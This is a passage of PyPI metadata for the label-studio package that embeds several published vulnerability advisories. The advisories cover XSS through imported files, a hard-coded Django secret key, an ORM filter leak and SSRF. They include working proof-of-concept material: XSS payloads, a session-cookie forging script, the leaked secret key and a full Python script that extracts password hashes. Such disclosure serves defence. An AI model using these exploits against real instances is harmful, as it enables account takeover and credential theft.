FileUpload.load_tasks_from_uploaded_files(project, file_upload_ids)\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n1. The file name that was set was retrieved from the URL.\n\nThe downloaded file path could then be retrieved by sending a request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]` where `{project_id}` was the ID of the project and `{download_id}` was the ID of the downloaded file. Once the downloaded file path was retrieved by the previous API endpoint, the [following code snippet](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/api.py#L595C1-L616C62) demonstrated that the `Content-Type` of the response was determined by the file extension, since `mimetypes.guess_type` guesses the `Content-Type` based on the file extension.\n\n```python\nclass UploadedFileResponse(generics.RetrieveAPIView):\n    permission_classes = (IsAuthenticated,)\n\n    @swagger_auto_schema(auto_schema=None)\n    def get(self, *args, **kwargs):\n        request = self.request\n        filename = kwargs['filename']\n        # XXX needed, on windows os.path.join generates '\\' which breaks FileUpload\n        file = settings.UPLOAD_DIR + ('/' if not settings.UPLOAD_DIR.endswith('/') else '') + filename\n        logger.debug(f'Fetch uploaded file by user {request.user} => {file}')\n        file_upload = FileUpload.objects.filter(file=file).last()\n\n        if not file_upload.has_permission(request.user):\n            return Response(status=status.HTTP_403_FORBIDDEN)\n\n        file = file_upload.file\n        if file.storage.exists(file.name):\n            content_type, encoding = mimetypes.guess_type(str(file.name)) <1>\n            content_type = content_type or 'application/octet-stream'\n            return RangedFileResponse(request, file.open(mode='rb'), content_type=content_type)\n        else:\n            return Response(status=status.HTTP_404_NOT_FOUND)\n```\n1. Determines the `Content-Type` based on the extension of the uploaded file by using `mimetypes.guess_type`.\n\nSince the `Content-Type` was determined by the file extension of the downloaded file, an attacker could import in a `.html` file that would execute JavaScript when visited.\n\n# Proof of Concept\n\nBelow were the steps to recreate this issue:\n\n1. Host the following HTML proof of concept (POC) script on an external website with the file extension `.html` that would be downloaded to the Label Studio website.\n\n```html\n<html>\n    <body>\n        <h1>Data Import XSS</h1>\n        <script>\n            alert(document.domain);\n        </script>\n    </body>\n</html>\n```\n\n2. Send the following `POST` request to download the HTML POC to the Label Studio and note the returned ID of the downloaded file in the response. In the following POC the `{victim_host}` is the address and port of the victim Label Studio website (eg. `labelstudio.com:8080`), `{project_id}` is the ID of the project where the data would be imported into, `{cookies}` are session cookies and `{evil_site}` is the website hosting the malicious HTML file (named `xss.html` in the following example).\n\n```http\nPOST /api/projects/{project_id}/import?commit_to_project=false HTTP/1.1\nHost: {victim_host}\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\ncontent-type: application/x-www-form-urlencoded\nContent-Length: 43\nConnection: close\nCookie: {cookies}\nPragma: no-cache\nCache-Control: no-cache\n\nurl=https://{evil_site}/xss.html\n```\n\n3. To retrieve the downloaded file path could be retrieved by sending a `GET` request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]`, where `{download_id}` is the ID of the file download from the previous step.\n\n4. Send your victim a link to `/data/{file_path}`, where `{file_path}` is the path of the downloaded file from the previous step. The following screenshot demonstrated executing the POC JavaScript code by visiting `/data/upload/1/cfcfc340-xss.html`.\n\n![xss-import-alert](https://user-images.githubusercontent.com/139727151/282223222-d8f9132c-838e-4aa6-9c03-a2bc83b4a409.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* For all user provided files that are downloaded by Label Studio, set the `Content-Security-Policy: sandbox;` response header when viewed on the site. The `sandbox` directive restricts a page's actions to prevent popups, execution of plugins and scripts and enforces a `same-origin` policy ([documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox)).\n* Restrict the allowed file extensions that could be downloaded.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.10.1"],"id":"GHSA-fq23-g58m-799r","link":"https://osv.dev/vulnerability/GHSA-fq23-g58m-799r","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-43791"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability was found to affect versions before `1.8.2`, where a patch was introduced.\n\n# Overview\n\nIn [Label Studio version 1.8.1](https://github.com/HumanSignal/label-studio/tree/1.8.1), a hard coded Django `SECRET_KEY` was set in the application settings. The Django `SECRET_KEY` is used for signing session tokens by the web application framework, and should never be shared with unauthorised parties.\n\nHowever, the Django framework inserts a `_auth_user_hash` claim in the session token that is a HMAC hash of the account's password hash. That claim would normally prevent forging a valid Django session token without knowing the password hash of the account. However, any authenticated user can exploit an Object Relational Mapper (ORM) Leak vulnerability in Label Studio to leak the password hash of any account on the platform, which is reported as a separate vulnerability. An attacker can exploit the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) and forge session tokens for all users on Label Studio using the hard coded `SECRET_KEY`.\n\n# Description\n\nBelow is the code snippet of the Django settings file at [`label_studio/core/settings/base.py`](https://github.com/HumanSignal/label-studio/blob/1.8.1/label_studio/core/settings/base.py#L108).\n\n```python\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = '$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n'\n```\n\nThis secret is hard coded across all instances of Label Studio.\n\n# Proof of Concept\n\nBelow are the steps that an attacker could do to forge a session token of any account on Label Studio:\n\n1. Exploit the ORM Leak vulnerability (patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to retrieve the full password hash that will be impersonated. For this example, a session token will be forged for an account with the email `ghostccamm@testvm.local` with the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=` that was retrieved.\n\n2. Create a new Django project with an empty application. In `cookieforge/cookieforge/settings.py` set the `SECRET_KEY` to `$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n`. Create a management command with the following code that will be used to create forged session tokens.\n\n```python\nfrom typing import Any\nfrom django.core.management.base import  BaseCommand, CommandParser\nfrom django.core import signing\nfrom django.utils.crypto import salted_hmac\nfrom django.conf import settings\nimport time, uuid\n\nclass Command(BaseCommand):\n    help = \"Forge a users session cookie on Label Studio\"\n\n    def add_arguments(self, parser: CommandParser) -> None:\n        parser.add_argument(\n            '-o', '--organisation',\n            help='Organisation ID to access',\n            default=1,\n            type=int\n        )\n\n        parser.add_argument(\n            'user_id',\n            help='The User ID of the victim you want to impersonate',\n            type=str\n        )\n\n        parser.add_argument(\n            'user_hash',\n            help='The password hash the user you want to impersonate'\n        )\n\n    def handle(self, *args: Any, **options: Any) -> str | None:\n        key = settings.SECRET_KEY\n        # Creates the _auth_user_hash HMAC of the victim's password hash\n        auth_user_hash = salted_hmac(\n            'django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash',\n            options['user_hash'],\n            secret=key,\n            algorithm=\"sha256\"\n        ).hexdigest()\n\n        session_dict = {\n            'uid': str(uuid.uuid4()), \n            'organization_pk': options['organisation'], \n            'next_page': '/projects/', \n            'last_login': time.time(), \n            '_auth_user_id': options['user_id'], \n            '_auth_user_backend': \n            'django.contrib.auth.backends.ModelBackend', \n            '_auth_user_hash': auth_user_hash, \n            'keep_me_logged_in': True, \n            '_session_expiry': 600\n        }\n\n        # Creates a forged session token\n        session_token = signing.dumps(\n            session_dict,\n            key=key,\n            salt=\"django.contrib.sessions.backends.signed_cookies\",\n            compress=True\n        )\n\n        self.stdout.write(\n            self.style.SUCCESS(f\"session token: {session_token}\")\n        )\n```\n\n3. Next run the following command replacing the `{user_id}` with the user ID of the account you want to the impersonate and `{user_hash}` with the victim's password hash. Copy the session token that is printed.\n\n```python\npython3 manage.py forgecookie {user_id} '{user_hash}'\n```\n\n4. Change the `sessionid` cookie on the browser and refresh the page. Observe being authenticated as the victim user.\n\n# Impact\n\nThis vulnerability can be chained with the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to impersonate any account on Label Studio. An attacker could exploit these vulnerabilities to escalate their privileges from a low privilege user to a Django Super Administrator user.\n\n# Remediation Advice\n\nIt is important to note that the hard coded `SECRET_KEY` has already been removed in Label Studio versions `>=1.8.2`. However, there has not been any public disclosure about the use of the hard coded secret key and users have not been informed about the security vulnerability.\n\nWe recommend that Human Signal to release a public disclosure about the hard coded `SECRET_KEY` to encourage users to patch to a version `>=1.8.2` to mitigate the likelihood of an attacker exploiting these vulnerabilities to impersonate all accounts on the platform.\n\n# Discovered\n- August 2023, Robert Schuh, @robbilie\n- August 2023, Alex Brown, elttam","fixed_in":["1.8.2"],"id":"GHSA-f475-x83m-rx5m","link":"https://osv.dev/vulnerability/GHSA-f475-x83m-rx5m","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47117"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2post0` and was tested on version `1.8.2`.\n\n# Overview\n\nIn all current versions of [Label Studio](https://github.com/HumanSignal/label-studio), the application allows users to insecurely set filters for filtering tasks. An attacker can construct a *filter chain* to filter tasks based on sensitive fields for all user accounts on the platform by exploiting Django's Object Relational Mapper (ORM). Since the results of query can be manipulated by the ORM filter, an attacker can leak these sensitive fields character by character. For an example, the following filter chain will task results by the password hash of an account on Label Studio.\n\n```\nfilter:tasks:updated_by__active_organization__active_users__password\n```\n\nFor consistency, this type of vulnerability will be termed as **ORM Leak** in the rest of this disclosure. \n\nIn addition, Label Studio had a hard coded secret key that an attacker can use to forge a session token of any user by exploiting this ORM Leak vulnerability to leak account password hashes.\n\n# Description\n\nThe following code snippet from the `ViewSetSerializer` in [`label_studio/data_manager/serializers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/serializers.py#L115) insecurely creates `Filter` objects from a JSON `POST` request to the `/api/dm/views/{viewId}` API endpoint.\n\n```python\n    @staticmethod\n    def _create_filters(filter_group, filters_data):\n        filter_index = 0\n        for filter_data in filters_data:\n            filter_data[\"index\"] = filter_index\n            filter_group.filters.add(Filter.objects.create(**filter_data))\n            filter_index += 1\n```\n\nThese `Filter` objects are then applied in the `TaskQuerySet` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L473).\n\n```python\nclass TaskQuerySet(models.QuerySet):\n    def prepared(self, prepare_params=None):\n        \"\"\" Apply filters, ordering and selected items to queryset\n\n        :param prepare_params: prepare params with project, filters, orderings, etc\n        :return: ordered and filtered queryset\n        \"\"\"\n        from projects.models import Project\n\n        queryset = self\n\n        if prepare_params is None:\n            return queryset\n\n        project = Project.objects.get(pk=prepare_params.project)\n        request = prepare_params.request\n        queryset = apply_filters(queryset, prepare_params.filters, project, request) <1>\n        queryset = apply_ordering(queryset, prepare_params.ordering, project, request, view_data=prepare_params.data)\n\n        if not prepare_params.selectedItems:\n            return queryset\n\n        # included selected items\n        if prepare_params.selectedItems.all is False and prepare_params.selectedItems.included:\n            queryset = queryset.filter(id__in=prepare_params.selectedItems.included)\n\n        # excluded selected items\n        elif prepare_params.selectedItems.all is True and prepare_params.selectedItems.excluded:\n            queryset = queryset.exclude(id__in=prepare_params.selectedItems.excluded)\n\n        return queryset\n```\n1. User provided filters are insecurely applied here by calling the `apply_filters` that constructs the Django ORM filter.\n\nThe `PreparedTaskManager` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L655) uses the vulnerable `TaskQuerySet` for building the Django queryset for querying `Task` objects, as shown in the following code snippet.\n\n```python\nclass PreparedTaskManager(models.Manager):\n    #...\n\n    def get_queryset(self, fields_for_evaluation=None, prepare_params=None, all_fields=False): <1>\n        \"\"\"\n        :param fields_for_evaluation: list of annotated fields in task\n        :param prepare_params: filters, ordering, selected items\n        :param all_fields: evaluate all fields for task\n        :param request: request for user extraction\n        :return: task queryset with annotated fields\n        \"\"\"\n        queryset = self.only_filtered(prepare_params=prepare_params)\n        return self.annotate_queryset(\n            queryset,\n            fields_for_evaluation=fields_for_evaluation,\n            all_fields=all_fields,\n            request=prepare_params.request\n        )\n\n    def only_filtered(self, prepare_params=None):\n        request = prepare_params.request\n        queryset = TaskQuerySet(self.model).filter(project=prepare_params.project) <1>\n        fields_for_filter_ordering = get_fields_for_filter_ordering(prepare_params)\n        queryset = self.annotate_queryset(queryset, fields_for_evaluation=fields_for_filter_ordering, request=request)\n        return queryset.prepared(prepare_params=prepare_params)\n```\n1. Special Django method for the `models.Manager` class that is used to retrieve the queryset for querying objects of a model.\n2. Uses the vulnerable `TaskQuerySet` that was explained above.\n\nThe following code snippet of the `Task` model in [`label_studio/tasks/models.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/models.py#L49C1-L102C102) shows that the vulnerable `PreparedTaskManager` is set as a class variable, along with the `updated_by` relational mapping to a Django user that will be exploited as the entrypoint of the filter chain.\n\n```python\n# ...\nclass Task(TaskMixin, models.Model):\n    \"\"\" Business tasks from project\n    \"\"\"\n    id = models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID', db_index=True)\n\n    # ...\n\n    updated_by = models.ForeignKey(settings.AUTH_USER_MODEL, related_name='updated_tasks',\n        on_delete=models.SET_NULL, null=True, verbose_name=_('updated by'),\n        help_text='Last annotator or reviewer who updated this task') <1>\n\n    # ...\n\n    objects = TaskManager()  # task manager by default\n    prepared = PreparedTaskManager()  # task manager with filters, ordering, etc for data_manager app <2>\n\n    # ...\n```\n1. The entry point of the filter chain to filter by the `updated_by__active_organization__active_users__password`.\n2. The vulnerable `PreparedTaskManager` being set that will be exploited.\n\nFinally, the `TaskListAPI` view set in [`label_studio/tasks/api.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/api.py#L205) with the `/api/tasks` API endpoint uses the vulnerable `PreparedTaskManager` to filter `Task` objects.\n\n```python\n    def get_queryset(self):\n        task_id = self.request.parser_context['kwargs'].get('pk')\n        task = generics.get_object_or_404(Task, pk=task_id)\n        review = bool_from_request(self.request.GET, 'review', False)\n        selected = {\"all\": False, \"included\": [self.kwargs.get(\"pk\")]}\n        if review:\n            kwargs = {\n                'fields_for_evaluation': ['annotators', 'reviewed']\n            }\n        else:\n            kwargs = {'all_fields': True}\n        project = self.request.query_params.get('project') or self.request.data.get('project')\n        if not project:\n            project = task.project.id\n        return self.prefetch(\n            Task.prepared.get_queryset(\n                prepare_params=PrepareParams(project=project, selectedItems=selected, request=self.request),\n                **kwargs\n            )) <1>\n```\n1. Uses the vulnerable `PreparedTaskManager` to filter objects.\n\n# Proof of Concept\n\nBelow are the steps to exploit about how to exploit this vulnerability to leak the password hash of an account on Label Studio.\n\n1. Create two accounts on Label Studio and choose one account to be the victim and the other the hacker account that you will use.\n2. Create a new project or use an existing project, then add a task to the project. Update the task with the hacker account to cause the entry point of the filter chain.\n3. Navigate to the task view for the project and add any filter with the `Network` inspect tab open on the browser. Look for a `PATCH` request to `/api/dm/views/{view_id}?interaction=filter&project={project_id}` and save the `view_id` and `project_id` for the next step.\n4. Download the attached proof of concept exploit script named `labelstudio_ormleak.py`. This script will leak the password hash of the victim account character by character. Run the following command to run the exploit script, replacing the `{view_id}`, `{project_id}`, `{cookie_str}` and `{url}` with the corresponding values. For further explanation run `python3 labelstudio_ormleak.py --help`.\n\n```bash\npython3 labelstudio_ormleak.py -v {view_id} -p {project_id} -c '{cookie_str}' -u '{url}'\n```\n\nThe following example GIF demonstrates exploiting this ORM Leak vulnerability to retrieve the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=`.\n\n![labelstudio_ormleak_poc](https://user-images.githubusercontent.com/139727151/266986646-a3d1367c-fb4d-4482-9b6a-18a5d7316385.gif)\n\n# Impact\n\nThis vulnerability can be exploited to completely compromise the confidentiality of highly sensitive account information, such as account password hashes. For all versions `<=1.8.1`, this finding can also be chained with hard coded `SECRET_KEY` to forge session tokens of any user on Label Studio and could be abuse to deteriorate the integrity and availability.\n\n# Remediation Advice\n\n* Do not use unsanitised values for constructing a filter for querying objects using Django's ORM. Django's ORM allows querying by relation field and performs auto lookups, that enable filtering by sensitive fields.\n* Validate filter values to an allow list before performing any queries.\n\n# Discovered\n- August 2023, Alex Brown, elttam\n\n---\n# `labelstudio_ormleak.py` proof of concept\n\n```py\nimport argparse\nimport re\nimport requests\nimport string\nimport sys\n\n# Password hash characters\nCHARS = string.ascii_letters + string.digits + '$/+=_!'\nCHARS_LEN = len(CHARS)\n\nPAYLOAD = {\n    \"data\": {\n        \"columnsDisplayType\": {},\n        \"columnsWidth\": {},\n        \"filters\": {\n            \"conjunction\": \"and\",\n            \"items\": [\n                {\n                    \"filter\": \"filter:tasks:updated_by__active_organization__active_users__password\", # ORM Leak filter chain\n                    \"operator\": \"regex\", # Use regex operator to filter password hash value\n                    \"type\": \"String\",\n                    \"value\": \"REPLACEME\"\n                }\n            ]\n        },\n        \"gridWidth\": 4,\n        \"hiddenColumns\":{\"explore\":[\"tasks:inner_id\"],\"labeling\":[\"tasks:id\",\"tasks:inner_id\"]},\n        \"ordering\": [],\n        \"search_text\": None,\n        \"target\": \"tasks\",\n        \"title\": \"Default\",\n        \"type\": \"list\"\n    },\n    \"id\": 1, # View ID\n    \"project\": \"1\" # Project ID\n}\n\ndef parse_args() -> argparse.Namespace:\n    parser = argparse.ArgumentParser(\n        description='Leak an accounts password hash by exploiting a ORM Leak vulnerability in Label Studio'\n    )\n\n    parser.add_argument(\n        '-v', '--view-id',\n        help='View id of the page',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-p', '--project-id',\n        help='Project id to filter tasks for',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-c', '--cookie-str',\n        help='Cookie string for authentication',\n        required=True\n    )\n\n    parser.add_argument(\n        '-u', '--url',\n        help='Base URL to Label Studio instance',\n        required=True\n    )\n\n    return parser.parse_args()\n\ndef setup() -> dict:\n    args = parse_args()\n    view_id = args.view_id\n    project_id = args.project_id\n    path_1 = \"/api/dm/views/{view_id}?interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    path_2 = \"/api/tasks?page=1&page_size=1&view={view_id}&interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    PAYLOAD[\"id\"] = view_id\n    PAYLOAD[\"project\"] = str(project_id)\n    \n    config_dict = {\n        'COOKIE_STR': args.cookie_str,\n        'URL_PATH_1': args.url + path_1,\n        'URL_PATH_2': args.url + path_2,\n        'PAYLOAD': PAYLOAD\n    }\n    return config_dict\n\ndef test_payload(config_dict: dict, payload) -> bool:\n    sys.stdout.flush()\n    cookie_str = config_dict[\"COOKIE_STR\"]\n    r_set = requests.patch(\n        config_dict[\"URL_PATH_1\"],\n        json=payload,\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_listen = requests.get(\n        config_dict['URL_PATH_2'],\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_json = r_listen.json()\n    return len(r_json[\"tasks\"]) >= 1\n\ndef test_char(config_dict, known_hash, c):\n    json_payload_suffix = PAYLOAD\n    test_escaped = re.escape(known_hash + c)\n    json_payload_suffix[\"data\"][\"filters\"][\"items\"][0][\"value\"] =  f\"^{test_escaped}\"\n\n    suffix_result = test_payload(config_dict, json_payload_suffix)\n    if suffix_result:\n        return (known_hash + c, c)\n    \n    return None\n\ndef main():\n    config_dict = setup()\n    # By default Label Studio password hashes start with these characters\n    known_hash = \"pbkdf2_sha256$260000$\"\n    print()\n    print(f\"dumped: {known_hash}\", end=\"\")\n    sys.stdout.flush()\n\n    while True:\n        found = False\n\n        for c in CHARS:\n            r = test_char(config_dict, known_hash, c)\n            if not r is None:\n                new_hash, c = r\n                known_hash = new_hash\n                print(c, end=\"\")\n                sys.stdout.flush()\n                found = True\n                break\n\n        if not found:\n            break\n\n    print()\n\nif __name__ == \"__main__\":\n    main()\n```","fixed_in":["1.9.2.post0"],"id":"GHSA-6hjj-gq77-j4qw","link":"https://osv.dev/vulnerability/GHSA-6hjj-gq77-j4qw","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-26152"],"details":"### Summary\nOn all Label Studio versions prior to 1.11.0, data imported via file upload feature is not properly sanitized prior to being rendered within a [`Choices`](https://labelstud.io/tags/choices) or [`Labels`](https://labelstud.io/tags/labels) tag, resulting in an XSS vulnerability.\n\n### Details\nNeed permission to use the \"data import\" function. This was reproduced on Label Studio 1.10.1.\n\n### PoC\n\n1. Create a project.\n![Create a project](https://github.com/HumanSignal/label-studio/assets/3943358/9b1536ad-feac-4238-a1bd-ca9b1b798673)\n\n2. Upload a file containing the payload using the \"Upload Files\" function.\n![2  Upload a file containing the payload using the Upload Files function](https://github.com/HumanSignal/label-studio/assets/3943358/26bb7af1-1cd2-408f-9adf-61e31a5b7328)\n![3  complete](https://github.com/HumanSignal/label-studio/assets/3943358/f2f62774-1fa6-4456-9e6f-8fa1ca0a2d2e)\n\nThe following are the contents of the files used in the PoC\n```\n{\n  \"data\": {\n    \"prompt\": \"labelstudio universe image\",\n    \"images\": [\n      {\n        \"value\": \"id123#0\",\n        \"style\": \"margin: 5px\",\n        \"html\": \"<img width='400' src='https://labelstud.io/_astro/images-tab.64279c16_ZaBSvC.avif' onload=alert(document.cookie)>\"\n      }\n    ]\n  }\n}\n```\n\n3. Select the text-to-image generation labeling template of Ranking and scoring\n![3  Select the text-to-image generation labelling template for Ranking and scoring](https://github.com/HumanSignal/label-studio/assets/3943358/f227f49c-a718-4738-bc2a-807da4f97155)\n![5  save](https://github.com/HumanSignal/label-studio/assets/3943358/9b529f8a-8e99-4bb0-bdf6-bb7a95c9b75d)\n\n4. Select a task\n![4  Select a task](https://github.com/HumanSignal/label-studio/assets/3943358/71856b7a-2b1f-44ea-99ab-fc48bc20caa7)\n\n5. Check that the script is running\n![5  Check that the script is running](https://github.com/HumanSignal/label-studio/assets/3943358/e396ae7b-a591-4db7-afe9-5bab30b48cb9)\n\n### Impact\nMalicious scripts can be injected into the code, and when linked with vulnerabilities such as CSRF, it can cause even greater damage. In particular, It can become a source of further attacks, especially when linked to social engineering.\n","fixed_in":["1.11.0"],"id":"GHSA-6xv9-957j-qfhg","link":"https://osv.dev/vulnerability/GHSA-6xv9-957j-qfhg","source":"osv","summary":null,"withdrawn":null}]},"1.3.post1":{"info":{"author":"Heartex","author_email":"hello@heartex.ai","bugtrack_url":null,"classifiers":["License :: OSI Approved :: Apache Software License","Operating System :: OS Independent","Programming Language :: Python :: 3"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://github.com/heartexlabs/label-studio","keywords":"","license":"","maintainer":"","maintainer_email":"","name":"label-studio","package_url":"https://pypi.org/project/label-studio/","platform":"","project_url":"https://pypi.org/project/label-studio/","project_urls":{"Homepage":"https://github.com/heartexlabs/label-studio"},"provides_extra":null,"release_url":"https://pypi.org/project/label-studio/1.3.post1/","requires_dist":["wheel","appdirs (>=1.4.3)","attr (==0.3.1)","attrs (>=19.2.0)","pyyaml (>=5.3.1)","azure-storage-blob (>=12.6.0)","boto (==2.49.0)","boto3 (==1.16.28)","botocore (==1.19.28)","google-cloud-storage (==1.28.1)","google-cloud-logging (==2.6.0)","Django (==3.1.13)","django-annoying (==0.10.6)","django-debug-toolbar (==3.2.1)","django-filter (==2.4.0)","django-model-utils (==4.1.1)","django-rq (==2.4.1)","django-cors-headers (==3.6.0)","django-extensions (==3.1.0)","django-rest-swagger (==2.2.0)","django-user-agents (==0.4.0)","django-ranged-fileresponse (>=0.1.2)","django-redis-cache (==3.0.0)","drf-dynamic-fields (==0.3.0)","drf-yasg (==1.20.0)","drf-generators (==0.3.0)","htmlmin (==0.1.12)","jsonschema (==3.2.0)","lockfile (>=0.12.0)","lxml (>=4.2.5)","numpy (>=1.19.1)","ordered-set (==4.0.2)","pandas (>=0.24.0)","protobuf (>=3.15.5)","psycopg2-binary (==2.9.1)","pydantic (<=1.8.2,>=1.7.3)","python-dateutil (==2.8.1)","pytz (==2019.3)","requests (<3,>=2.22.0)","rq (==1.10.0)","rules (==2.2)","ujson (>=3.0.0)","xmljson (==0.2.0)","colorama (>=0.4.4)","boxing (>=0.1.4)","redis (>=3.5.0)","sentry-sdk (>=1.1.0)","label-studio-converter (==0.0.33rc1)","mysqlclient ; extra == 'mysql'"],"requires_python":">=3.6","summary":"Label Studio annotation tool","version":"1.3.post1","yanked":false,"yanked_reason":null},"last_serial":25820833,"urls":[{"comment_text":"","digests":{"blake2b_256":"6da58b48eb60d269c4b99b78c0915085f5fb91503ea966ca0b07b503bd2b01fb","md5":"dca3719d2490167bc41299121402045a","sha256":"053ae7458bd4d502e53086d50c83965fe0f4a35d6eea2bb516fbc063cae5a2ec"},"downloads":-1,"filename":"label_studio-1.3.post1-py3-none-any.whl","has_sig":false,"md5_digest":"dca3719d2490167bc41299121402045a","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.6","size":49752938,"upload_time":"2021-10-18T15:03:38","upload_time_iso_8601":"2021-10-18T15:03:38.257796Z","url":"https://files.pythonhosted.org/packages/6d/a5/8b48eb60d269c4b99b78c0915085f5fb91503ea966ca0b07b503bd2b01fb/label_studio-1.3.post1-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"32c6de47da182434f98fd25cdccb3da7463e6221031f2ead41af147e6dd6cef3","md5":"735dd0f7f4c294928eca241c075ddf4f","sha256":"3f748acf2ac2e21f7b42b5c31f85fc80ca9154f9a6023d7b453cdba3b2ee8ada"},"downloads":-1,"filename":"label-studio-1.3.post1.tar.gz","has_sig":false,"md5_digest":"735dd0f7f4c294928eca241c075ddf4f","packagetype":"sdist","python_version":"source","requires_python":">=3.6","size":49250831,"upload_time":"2021-10-18T15:03:56","upload_time_iso_8601":"2021-10-18T15:03:56.964883Z","url":"https://files.pythonhosted.org/packages/32/c6/de47da182434f98fd25cdccb3da7463e6221031f2ead41af147e6dd6cef3/label-studio-1.3.post1.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF. This issue is fixed in version 1.6.0.","fixed_in":["1.6.0"],"id":"GHSA-pc6f-259w-w3j6","link":"https://osv.dev/vulnerability/GHSA-pc6f-259w-w3j6","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF.","fixed_in":["1.5.0.post0"],"id":"PYSEC-2022-300","link":"https://osv.dev/vulnerability/PYSEC-2022-300","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47116"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to [`1.11.0`](https://github.com/HumanSignal/label-studio/releases/tag/1.11.0) and was tested on version `1.8.2`.\n\n# Overview\n\nLabel Studio's SSRF protections that can be enabled by setting the `SSRF_PROTECTION_ENABLED` environment variable can be bypassed to access internal web servers. This is because the current SSRF validation is done by executing a single DNS lookup to verify that the IP address is not in an excluded subnet range. This protection can be bypassed by either using HTTP redirection or performing a [DNS rebinding attack](https://en.wikipedia.org/wiki/DNS_rebinding).\n\n# Description\n\nThe following `tasks_from_url` method in [`label_studio/data_import/uploader.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_import/uploader.py#L127-L155) performs the SSRF validation (`validate_upload_url`) before sending the request.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1]\n\n        validate_upload_url(url, block_local_urls=settings.SSRF_PROTECTION_ENABLED)\n        # Reason for #nosec: url has been validated as SSRF safe by the\n        # validation check above.\n        response = requests.get(\n            url, verify=False, headers={'Accept-Encoding': None}\n        )  # nosec\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(\n            user, project, SimpleUploadedFile(filename, file_content)\n        )\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(\n            project, file_upload_ids\n        )\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n\nThe `validate_upload_url` code in [`label_studio/core/utils/io.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/core/utils/io.py#L174-L209) is shown 